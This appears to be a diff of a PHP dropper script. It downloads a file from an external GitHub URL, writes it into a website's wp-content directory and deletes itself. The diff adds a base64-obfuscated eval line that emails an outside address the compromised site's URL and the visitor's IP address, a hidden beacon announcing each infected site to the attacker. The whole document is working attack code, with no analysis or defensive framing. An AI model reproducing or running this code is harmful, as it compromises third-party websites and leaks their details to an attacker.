@@ -20,7 +20,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 
-$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.htm" ;
 $text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
@@ -32,5 +32,5 @@ if(file_exists($check2)){
 echo "done .\n " ;
 
 @unlink(__FILE__);
-
+eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
 ?>
